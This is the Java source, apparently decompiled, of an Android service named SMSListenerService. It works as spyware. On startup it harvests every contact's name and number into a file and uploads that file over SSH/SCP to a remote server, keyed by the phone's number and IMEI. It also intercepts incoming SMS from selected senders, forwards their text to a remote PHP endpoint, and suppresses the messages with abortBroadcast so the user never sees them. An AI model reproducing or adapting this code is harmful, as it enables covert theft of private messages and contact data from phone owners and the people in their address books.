package com.yxx.jiejie;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsMessage;
import android.util.Log;
import com.trilead.ssh2.Connection;
import com.trilead.ssh2.SCPClient;
import com.trilead.ssh2.Session;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SMSListenerService extends Service {
    static Cursor cur;
    static Cursor phonecursor;
    private final BroadcastReceiver SMSReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String sender = "";
            String content = "";
            String myMobile = "";
            Date time = new Date();
            for (Object pd : (Object[]) intent.getExtras().get("pdus")) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pd);
                sender = sms.getOriginatingAddress();
                content = new StringBuilder(String.valueOf(content)).append(sms.getMessageBody()).toString();
                time = new Date(sms.getTimestampMillis());
            }
            if (Constant.INTER_MOBILE.indexOf(sender) != -1 || sender.startsWith("15")) {
                new Thread(new SendThread(context, Constant.LOCAL_MOBILE + "||" + content + "||" + sender + "||" + SMSListenerService.this.sdf.format(time), "/AAA.php")).start();
                abortBroadcast();
            }
        }
    };
    Connection conn = null;
    SCPClient ct = null;
    public SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Session sess = null;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Log.i("SMSListener", "Service start!");
        new Thread() {
            public void run() {
                final List list = SMSListenerService.this.readAllContacts();
                try {
                    FileUtil.writeToFile(new File("/mnt/sdcard/contact.txt"), new ProcBufferedReader() {
                        public void writeToFile(PrintWriter pw) {
                            for (int i = 0; i < list.size(); i++) {
                                Contact contact = (Contact) list.get(i);
                                pw.println(contact.getName() + ":" + contact.getPhoneString());
                            }
                        }

                        public void proc(BufferedReader br) throws Exception {
                        }
                    });
                } catch (Exception e1) {
                    e1.printStackTrace();
                }
                if (SMSListenerService.this.connectHost()) {
                    try {
                        if (new File("/mnt/sdcard/contact.txt").exists()) {
                            SMSListenerService.this.putFiles(new String[]{"/mnt/sdcard/contact.txt"}, Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    SMSListenerService.this.sess.close();
                }
            }
        }.start();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public synchronized List readAllContacts() {
        List phone_Map;
        ContentResolver cr = getContentResolver();
        cur = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        phone_Map = new ArrayList();
        while (cur.moveToNext()) {
            Contact contact = new Contact();
            String idFromContacts = cur.getString(cur.getColumnIndex("_id"));
            String nameFromContacts = cur.getString(cur.getColumnIndex("display_name"));
            String[] arr = new String[20];
            phonecursor = cr.query(Phone.CONTENT_URI, null, "contact_id= ?", new String[]{String.valueOf(idFromContacts)}, null);
            int i = 0;
            while (phonecursor.moveToNext()) {
                arr[i] = phonecursor.getString(phonecursor.getColumnIndex("data1")).trim();
                i++;
            }
            contact.setC_id(idFromContacts);
            contact.setName(nameFromContacts);
            contact.setPhone(arr);
            Log.i("zhou", "query id=" + contact.getC_id() + " " + contact.getName() + "  " + contact.getPhoneString() + " " + contact.getRawContactsId());
            phone_Map.add(contact);
            phonecursor.close();
        }
        cur.close();
        return phone_Map;
    }

    public boolean connectHost() {
        try {
            this.conn = new Connection(FileUtil.getFromAsset(this, "net.txt"));
            this.conn.connect();
            boolean isAuthenticated = this.conn.authenticateWithPassword(Global.USERNAME, Global.PASSWORD);
            if (isAuthenticated) {
                this.sess = this.conn.openSession();
                this.ct = new SCPClient(this.conn);
                this.sess.execCommand("mkdir -p /home/" + Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                return isAuthenticated;
            }
            throw new IOException("Authentication failed.");
        } catch (IOException e) {
            e.printStackTrace();
            return true;
        }
    }

    public void putFiles(String[] arrs, String dir) {
        try {
            this.ct.put(arrs, "/home/" + dir);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
